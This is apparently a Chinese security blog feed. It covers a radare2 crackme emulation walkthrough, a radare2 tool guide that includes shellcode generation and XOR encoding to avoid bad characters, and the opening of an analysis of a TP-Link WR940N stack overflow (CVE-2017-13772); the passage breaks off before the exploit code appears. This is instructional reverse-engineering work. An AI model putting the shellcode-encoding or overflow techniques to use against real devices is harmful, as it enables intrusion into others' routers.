<p>拿到个程序，我会首先看函数调用理解程序的大概流程。比如这里先调用了 <code>printf</code> 打印了一些提示信息，然后使用 <code>scanf</code> 获取我们的输入，分析 <code>scanf</code>的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">|           0x080484cc      8d45fc         lea eax, [local_4h]</div><div class="line">|           0x080484cf      89442404       mov dword [local_4h_2], eax</div><div class="line">|           0x080484d3      c70424348604.  mov dword [esp], 0x8048634  ; [0x8048634:4]=0x6425</div><div class="line">|           0x080484da      e851feffff     call sym.imp.scanf          ; int scanf(const char *format)</div></pre></td></tr></table></figure></p>
<p>我们可以知道<code>0x8048634</code> 是我们的第一个参数, <code>local_4h</code>是我们的第二个参数。看看 <code>0x8048634</code>存放的是什么。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509536913132ckutls7d.png?imageslim" alt="paste image"></p>
<p>所以程序需要我们输入的是一个 整数，然后把它存在 <code>local_4h</code>里面了。那我们就可以把  <code>local_4h</code> 变量改下名字。这里改成 <code>input</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509537156669asiszojb.png?imageslim" alt="paste image"></p>
<p>继续往下看发现 <code>input</code> 变量后来没有被处理直接传到了  <code>test</code> 函数。他的第二个参数是这样生成的</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509538263559azqlu0hp.png?imageslim" alt="paste image"></p>
<p>为了获得这个参数我们有很多方法，比如 我们可以直接静态分析，或者用 <code>gdb</code> 调试这都很容易得到结果。</p>
<p>这里正好试试 <code>radare</code> 的模拟执行功能。使用该功能我们需要先分析要模拟执行的代码对环境的依赖，比如寄存器的值，内存的值等，然后根据依赖关系修改内存和寄存器的值来满足代码运行的上下文。</p>
<p>在这里这段代码只对栈的内存进行了处理。那我们就先分配一块内存，然后用 <code>esp</code> 刚刚分配的内存。由于这里一开始没有对内存数据进行读取，所以我们直接使用分配的内存就好，不用对他进行处理。</p>
<p>首先我们跳到目标地址，然后使用 <code>aei</code> 或者 <code>aeip</code> 初始化虚拟机堆栈，然后使用 <code>aer</code> 查看寄存器状态。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15095388389068csy8248.png?imageslim" alt="paste image"></p>
<p>然后分配一块内存作为栈内存，给程序模拟执行用。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509538957638rwu5ocqr.png?imageslim" alt="paste image"></p>
<p>在 <code>0xff0000</code> 分配了 <code>0x40000</code> 大小的内存。然后把 <code>esp</code> 和 <code>ebp</code> 指到这块内存里面。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509539081176y3sckgra.png?imageslim" alt="paste image"></p>
<p>然后我们让模拟器运行到 <code>0x0804850c</code> 也就是调用 <code>test</code> 函数的位置处，查看他的参数，可以看到第二个参数的值就是 <code>0x00052b24</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509539169362t234cqgc.png?imageslim" alt="paste image"><br>最后我们进去 <code>test</code> 函数里面看看</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150953929096164elui3y.png?imageslim" alt="paste image"><br>就是判断 <code>参数一</code> 和 <code>参数二</code> 是否一致，所以这个 <code>crackme</code> 的 <code>key</code> 就是 <code>0x00052b24</code> 十进制数表示 <code>338724</code>.<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509539408734tys3o1xg.png?imageslim" alt="paste image"></p>
<p>成功</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>radare2</code> 的模拟执行功能是通过 <code>esil</code> 来实现的，粗略的试了一下感觉还是挺不错的感觉和  <code>unicorn</code> 有的一拼，不过<code>radare2</code>也是有 <code>unicorn</code>的插件的。</p>
<p> 参考：</p>
<p> <a href="http://radare.org/r/talks.html" target="_blank" rel="external">http://radare.org/r/talks.html</a></p>
<p> <a href="https://github.com/radare/radare2book" target="_blank" rel="external">https://github.com/radare/radare2book</a></p>
<p> <a href="https://codeload.github.com/radareorg/r2con/" target="_blank" rel="external">https://codeload.github.com/radareorg/r2con/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> radare2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之radare2使用全解]]></title>
      <url>/2017/10/31/step_by_step_pwn_router_part7.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p><code>radare2</code> 最近越来越流行，已经进入 <code>github</code> 前 25了，看到大佬们纷纷推荐，为了紧跟时代潮流，我也决定探究探究这款 <code>神器</code> 。下面画画重点，以便以后需要用了，可以方便查找。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先是安装 <code>radare2</code> ,直接去官方 <code>github</code> 安照指示安装即可。先把源代码下载下来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/radare/radare2</div></pre></td></tr></table></figure>
<p>然后进入源码目录，执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sys/install.sh</div></pre></td></tr></table></figure>
<p><code>radare2</code> 支持各种各样的平台，文件格式，具体可以看官网描述。它有很多各组件分别进行不同的工作。这些组件是：</p>
<ul>
<li>rax2 ———&gt; 用于数值转换</li>
<li>rasm2  ——-&gt;  反汇编和汇编</li>
<li>rabin2 ——-&gt;  查看文件格式</li>
<li>radiff2 ——&gt;  对文件进行 diff</li>
<li>ragg2/ragg2­cc ——&gt;  用于更方便的生成shellcode</li>
<li>rahash2 ——&gt; 各种密码算法， hash算法</li>
<li>radare2 ——&gt; 整合了上面的工具</li>
</ul>
<h3 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h3><p>数值转换，程序的 <code>help</code> 菜单很明确了:</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509440109544fxedvvf0.png?imageslim" alt="paste image"></p>
<p>比如输入<code>rax2 -s 414141</code> ,会返回 <code>AAAA</code></p>
<h3 id="rabin2"><a href="#rabin2" class="headerlink" title="rabin2"></a>rabin2</h3><p>对各种文件格式进行解析。</p>
<p><code>rabin2 -I hello_pwn</code> 显示文件的信息</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509442510111na1s1dfo.png?imageslim" alt="paste image"></p>
<p>使用 <code>-l</code> 显示依赖库。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509442808573t2mk98r0.png?imageslim" alt="paste image"></p>
<p>使用 <code>-zz</code> 显示字符串信息，可以显示 <code>utf-8</code> 等宽字节字符串。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509442931440cmccvl54.png?imageslim" alt="paste image"></p>
<p>可以看到显示了长度，所在位置等信息。</p>
<p>通过使用 <code>-O</code> 选项可以修改一些文件的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rabin2 -O?</div><div class="line">Operation string:</div><div class="line">  Change Entrypoint: e/0x8048000</div><div class="line">  Dump Symbols: d/s/1024</div><div class="line">  Dump Section: d/S/.text</div><div class="line">  Resize Section: r/.data/1024</div><div class="line">  Remove RPATH: R</div><div class="line">  Add Library: a/l/libfoo.dylib</div><div class="line">  Change Permissions: p/.data/rwx</div><div class="line">  Show LDID entitlements: C</div></pre></td></tr></table></figure>
<p>比如修改 <code>section</code> 的属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rabin2 -S a.out | grep text</div><div class="line">idx=14 vaddr=0x00400430 paddr=0x00000430 sz=386 vsz=386 perm=--rwx name=.text</div><div class="line">haclh@ubuntu:~$ rabin2 -O p/.text/r a.out </div><div class="line">wx 02 @ 0x1d60</div><div class="line">haclh@ubuntu:~$ rabin2 -S a.out | grep text</div><div class="line">idx=14 vaddr=0x00400430 paddr=0x00000430 sz=386 vsz=386 perm=--r-- name=.text</div></pre></td></tr></table></figure>
<h3 id="rasm2"><a href="#rasm2" class="headerlink" title="rasm2"></a>rasm2</h3><p>这个工具用于进行各种平台的汇编和反汇编。该工具的主要选项有。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-a 设置汇编和反汇编的架构（比如x86,mips, arm...）</div><div class="line">-L  列举支持的架构。</div><div class="line">-b  设置 位数</div><div class="line">-d，-D  反汇编 提供的 16进制字符串。</div></pre></td></tr></table></figure></p>
<p>使用示例：<br>首先列举支持的架构（使用 <code>head</code> 只列举前面几项）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rasm2 -L | head</div><div class="line">_dAe  8 16       6502        LGPL3   6502/NES/C64/Tamagotchi/T-1000 CPU</div><div class="line">_dA_  8          8051        PD      8051 Intel CPU</div><div class="line">_dA_  16 32      arc         GPL3    Argonaut RISC Core</div><div class="line">a___  16 32 64   arm.as      LGPL3   as ARM Assembler (use ARM_AS environment)</div><div class="line">adAe  16 32 64   arm         BSD     Capstone ARM disassembler</div><div class="line">_dA_  16 32 64   arm.gnu     GPL3    Acorn RISC Machine CPU</div><div class="line">_d__  16 32      arm.winedbg LGPL2   WineDBG&apos;s ARM disassembler</div><div class="line">adAe  8 16       avr         GPL     AVR Atmel</div><div class="line">adAe  16 32 64   bf          LGPL3   Brainfuck (by pancake, nibble) v4.0.0</div><div class="line">_dA_  16         cr16        LGPL3   cr16 disassembly plugin</div></pre></td></tr></table></figure>
<p>使用 <code>arm</code> 插件，汇编 三条 <code>nop</code> 指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rasm2 -a arm &quot;nop;nop;nop;&quot;</div><div class="line">0000a0e10000a0e10000a0e1</div></pre></td></tr></table></figure>
<p>然后我们使用 <code>-d</code> 把它反汇编出来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rasm2 -a arm -d 0000a0e10000a0e10000a0e1</div><div class="line">mov r0, r0</div><div class="line">mov r0, r0</div><div class="line">mov r0, r0</div></pre></td></tr></table></figure>
<p>我可以在命令后面加上 <code>-r</code> 打印出在 <code>radare2</code>中实现对应的功能，需要使用的命令( <code>wa</code> 命令的作用是，汇编给出的指令，并把汇编得到的数据写到相应位置，默认是当前位置)。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rasm2 -a arm -d 0000a0e10000a0e10000a0e1 -r</div><div class="line">e asm.arch=arm</div><div class="line">e asm.bits=32</div><div class="line">&quot;wa mov r0, r0;mov r0, r0;mov r0, r0;&quot;</div></pre></td></tr></table></figure></p>
<h3 id="ragg2-ragg2·cc"><a href="#ragg2-ragg2·cc" class="headerlink" title="ragg2/ragg2·cc"></a>ragg2/ragg2·cc</h3><p><code>radare2</code> 自己实现的 c 编译器，可以方便的写<code>shellcode</code> .<br>示例一：</p>
<p>代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int main() &#123; write (1,&quot;hi\n&quot;, 3); exit(0); &#125;</div></pre></td></tr></table></figure></p>
<p>使用下面的命令，把它编译成x86 32位代码：</p>
<p><code>ragg2-cc -a x86 -b 32 -d -o test test.c</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509456151971l3h3i5vj.png?imageslim" alt="paste image"></p>
<p>可以生成正常的 <code>elf</code> 文件用于测试，可以使用 <code>-c</code> 只编译出 <code>shellcode</code> </p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15094562677604lzx38lm.png?imageslim" alt="paste image"><br>生成的 <code>shellcode</code> 存在于 <code>test.c.text</code> 文件里面，下面是用 <code>radare2</code> 反汇编得到的代码，可以看到使用了 系统调用来实现代码的功能。</p>
<p>使用 <code>ragg2-cc</code> 生成的 <code>shellcode</code> 可以使用 <code>ragg2</code>中的 <code>xor</code> 编码器来编码字符，绕过一些字符限制，比如 <code>\x00</code>。<br>首先生成<code>shellcode</code> 的16进制表示。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ragg2-cc -a x86 -b 32 -d -x test.c</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150945684017052tc8caw.png?imageslim" alt="paste image"></p>
<p>然后使用 <code>rasm2</code> 验证下</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509456968736cujc5nti.png?imageslim" alt="paste image"><br>代码和上面的是一样的。<br>然后使用 <code>ragg2</code> 使用 <code>xor</code> 编码器编码 <code>shellcode</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509457754035xiiwmp5s.png?imageslim" alt="paste image"></p>
<p>就是在 <code>shellcode</code> 执行前使用 <code>xor</code> 指令把<code>shellcode</code> 还原。这样就可以消除掉一些坏字符。</p>
<p><code>ragg2</code> 也有自己 编写 <code>shellcode</code> 的语法。下面是一个示例，具体请看官方文档。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509458272098w4gx320m.png?imageslim" alt="paste image"></p>
<p>使用这种方式，我们就能使用最接近 <code>汇编</code> 的类c语言 来编写跨平台 <code>shellcode</code></p>
<h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><p>用于使用加密算法，hash算法等计算值</p>
<p>使用<code>-L</code> 可以列举支持的算法，比如算算 md5<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rahash2 -a md5 -s admin</div><div class="line">0x00000000-0x00000004 md5: 21232f297a57a5a743894a0e4a801fc3</div></pre></td></tr></table></figure></p>
<h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><p>最常用的工具了。整合了上面所有的工具。直接使用 <code>r2 target_bin</code> 进入程序。使用<code>-d</code> 选项进入调试模式。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509458880413jxib0gco.png?imageslim" alt="paste image"><br><code>radare2</code> 中的命令格式为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[.][times][cmd][~grep][@[@iter]addr!size][|&gt;pipe] ;</div></pre></td></tr></table></figure></p>
<p><code>px</code>表示打印16进制数，默认从当前位置开始。参数控制打印的字节数，下面这张图应该就可以大概解释上面的格式了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459118495u8fvnh9m.png?imageslim" alt="paste image"></p>
<p><code>@ addr</code> 表示该命令从 <code>addr</code> 开始执行。<code>addr</code> 不一定是 地址也可以是 <code>radare2</code> 中识别的符号，比如 <code>main</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150945933341282rex3iw.png?imageslim" alt="paste image"><br>还有一个重要的东西要记得，在命令的后面加个 <code>?</code> ，就可以查看帮助。直接输入<code>?</code> 可以查看所有的命令。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459469161neog4ssx.png?imageslim" alt="paste image"></p>
<p>下面按照我们在 <code>ida</code> 中使用的功能，来介绍 <code>radare2</code><br>首先在 用 <code>ida</code> 分析程序时，在 <code>ida</code> 加载程序后默认会对程序进行分析。<code>radare2</code> 相应的功能是以 <code>a</code> 开头的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459639393vrpsfsr3.png?imageslim" alt="paste image"><br>注释很简明了。我们使用 <code>aaa</code> 就可以进行完整分析了。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459732526wt8fv8vk.png?imageslim" alt="paste image"></p>
<p>分析前 <code>radare2</code> 识别不了函数，分析后就可以正常打印函数代码了（<code>pdf</code> 打印函数代码）</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509459800808z40o2w75.png?imageslim" alt="paste image"></p>
<p>有时候我们不需要分析整个 二进制文件，或者有个函数  <code>radare2</code>没有识别出来我们可以 <code>af</code> 来分析该函数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460038689y3ejljvr.png?imageslim" alt="paste image"></p>
<p>我们可以使用  <code>s</code> 跳转到想要跳转的位置。<br>跳转到 <code>main</code> 函数，并 定义该函数，然后打印函数代码</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15094601604612rtzywu2.png?imageslim" alt="paste image"></p>
<p><code>pd</code>  类命令用于打印汇编信息。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460248195wabrhoh5.png?imageslim" alt="paste image"></p>
<p>具体看帮助。<br>使用 <code>VV</code> 进入 图形化模式（需要是函数范围内）。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15094603917512ee12s3o.png?imageslim" alt="paste image"><br>在图形化模式下，输入 <code>?</code> 可以查看图形化模式的帮助。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460451292vd4u4cma.png?imageslim" alt="paste image"></p>
<p>使用 <code>hjkl</code> 来移动图形</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460648267s237v95k.png?imageslim" alt="paste image"></p>
<p>使用 <code>p/P</code>  切换图形模式</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460704922bax3wo07.png?imageslim" alt="paste image"></p>
<p>在图形模式下使用 <code>:</code> 可以输入<code>radare2</code> 命令</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461026761tbpeekgu.png?imageslim" alt="paste image"></p>
<p>输入 <code>!</code> ， 在调试的时候应该很有用</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461098057g2hz9wjr.png?imageslim" alt="paste image"></p>
<p>使用 空格 ，切换图形模式和文本模式</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460817550ho8w5er5.png?imageslim" alt="paste image"></p>
<p>在文本模式模式下也可以使用 <code>p</code> 来切换视图。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509460884141o5b4k28f.png?imageslim" alt="paste image"><br>剩下的看帮助。</p>
<p>下面介绍如何使用 <code>radare2</code> patch程序。首先需要在打开文件时使用 <code>r2 -w</code> 来以可写模式打开文件，这样 <code>pathch</code> 才能应用到文件 ( 或者在 <code>radare2</code> 下使用 <code>e io.cache=true</code>, 来允许进行 <code>patch</code>, 不过这样的话文件的修改不会影响原文件 )</p>
<p><code>w</code> 系列命令用于修改文件。</p>
<p>使用 <code>wa</code> 可以使用 汇编指令进行 <code>patch</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461504180vks7xzbj.png?imageslim" alt="paste image"></p>
<p>使用 <code>&quot;wa nop;nop;nop;nop;&quot;</code> 可以同时写入多条指令。<br><code>双引号不能省</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461564911w4lzfklw.png?imageslim" alt="paste image"><br>或者可以使用 <code>wx</code> 写入 16进制数据<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461691131dl2qawda.png?imageslim" alt="paste image"><br>其他的请看 <code>w?</code> ，查看帮助。</p>
<p>还可以 <code>可视化汇编/patch</code> 程序</p>
<p>输入 <code>Vp</code> ，然后输入 <code>A</code>, 就可以了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509461967246b3yfuntc.png?imageslim" alt="paste image"></p>
<p>使用 <code>/</code> 系列命令可以搜索字符串， rop gadgets等</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15094620829681a9ko1pz.png?imageslim" alt="paste image"></p>
<p>查询字符串交叉引用可以依次使用下列方法。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509462186812m98x995a.png?imageslim" alt="paste image"></p>
<p><code>ax?</code> 系列命令用于管理交叉引用。 <code>/r</code> 可以搜索交叉引用,  <code>aae</code>  是使用<code>radare2</code>中的模拟执行功能，动态的检测交叉引用。</p>
<p><strong>下面画重点</strong></p>
<p><code>radare2</code>中其实也是有 <code>反编译功能</code>, 使用 <code>pdc</code>  就可以查看伪代码，虽然和 <code>ida</code> 的还有很大的差距，但是在一些  <code>ida</code>  不支持 <code>f5</code> 的情况下这个功能还是不错的，可以用来看程序的大概逻辑。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509462614283a92qwc4d.png?imageslim" alt="paste image"></p>
<p>在图形化模式下，按下 <code>$</code> 看看，有惊喜。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509462803351x6n0h9gz.png?imageslim" alt="paste image"><br>帮我们解析汇编指令，用 c 代码的格式来显示。妈妈再也不用担心我不会汇编了。</p>
<p><code>radare2</code>和  <code>ida</code> 相比还有一个最大的优势，那就是它自带模拟执行功能。它使用了一种 <code>esil</code> 语言，来定义程序的行为，并且可以根据这个来模拟执行程序代码。 </p>
<p><code>ESIL</code> 的具体语法可以去看官方文档。下面列举两个示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov ecx, ebx -&gt; ebx,ecx,=</div><div class="line">add ebx, edi -&gt;edi,ebx,+=,$o,of,=,$s,sf,=,$z,zf,=,$c31,cf,=,$p,</div></pre></td></tr></table></figure>
<p>可以使用 <code>e asm.esil = true</code>显示 <code>esil</code> 代码</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509464681373qlis3k0v.png?imageslim" alt="paste image"><br>和 <code>ESIL</code>相关的命令是 </p>
<p><code>ae?</code>这一类指令。这个我也不熟悉，大概的用法是，使用 <code>ae?</code>这一类指令设置好 指令执行虚拟机的状态，然后设置好模拟执行的终止状态，在停止时，做一些操作，主要用于解密字符串，脱壳等等。</p>
<p>具体事例可以看：</p>
<p><a href="https://blog.xpnsec.com/radare2-using-emulation-to-unpack-metasploit-encoders/" target="_blank" rel="external">https://blog.xpnsec.com/radare2-using-emulation-to-unpack-metasploit-encoders/</a></p>
<p>此外 <code>radare2</code>还支持各种语言对他进行调用， 以及拥有大量的插件。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> <code>radare2</code>还是很强大的，特别是全平台反编译，全平台模拟执行，各种文件的patch, 修改。感觉在 ida 没法 <code>f5</code>的平台上首选 <code>radare2</code></p>
<p> 参考：</p>
<p> <a href="http://radare.org/r/talks.html" target="_blank" rel="external">http://radare.org/r/talks.html</a></p>
<p> <a href="https://github.com/radare/radare2book" target="_blank" rel="external">https://github.com/radare/radare2book</a></p>
<p> <a href="https://codeload.github.com/radareorg/r2con/" target="_blank" rel="external">https://codeload.github.com/radareorg/r2con/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> radare2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之wr940栈溢出漏洞分析与利用]]></title>
      <url>/2017/10/29/step_by_step_pwn_router_part5.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>这个是最近爆出来的漏洞，漏洞编号：<a href="https://www.fidusinfosec.com/tp-link-remote-code-execution-cve-2017-13772/" target="_blank" rel="external">CVE-2017-13772</a></p>
<p>固件链接：<a href="http://static.tp-link.com/TL-WR940N(US)_V4_160617_1476690524248q.zip" target="_blank" rel="external">http://static.tp-link.com/TL-WR940N(US)_V4_160617_1476690524248q.zip</a></p>
<p>之前使用 <code>firmadyn</code> 可以正常模拟运行，但是调试不了，就没有仔细看这个漏洞。今天突然想起 他会启动一个 <code>ssh</code> 服务，那我们是不是就可以通过<code>ssh</code> 连上去进行调试，正想试试，又不能正常模拟了。。。。。下面看具体漏洞。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>漏洞位与 管理员用来     <code>ping</code> 的功能，程序在获取<code>ip</code> 地址时没有验证长度，然后复制到栈上，造成栈溢出。搜索关键字符串 <code>ping_addr</code> 定位到函数 <code>sub_453C50</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15092873431355nyiesez.png?imageslim" alt="paste image"><br>获取 <code>ip</code> 地址后，把字符串指针放到 <code>$s6</code>寄存器，跟下去看看。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509287498785ykojz8u0.png?imageslim" alt="paste image"></p>
<p>传入了<code>ipAddrDispose</code>函数，继续分析之：</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509287595268qwyfsd2y.png?imageslim" alt="paste image"><br>先调用了 <code>memset</code>  初始化缓冲区，然后调用 <code>strcpy</code> 把 <code>ip</code> 地址复制到栈上，溢出。</p>
<p>利用的话和前文是一样的，经典的栈溢出，经典的 rop。</p>
<p><a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-28-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8Brop%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98.html" target="_blank" rel="external">一步一步pwn路由器之rop技术实战</a></p>
<p><a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html" target="_blank" rel="external">一步一步pwn路由器之路由器环境修复&amp;&amp;rop技术分析</a></p>
<p>附上参考链接里的 <code>exp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div 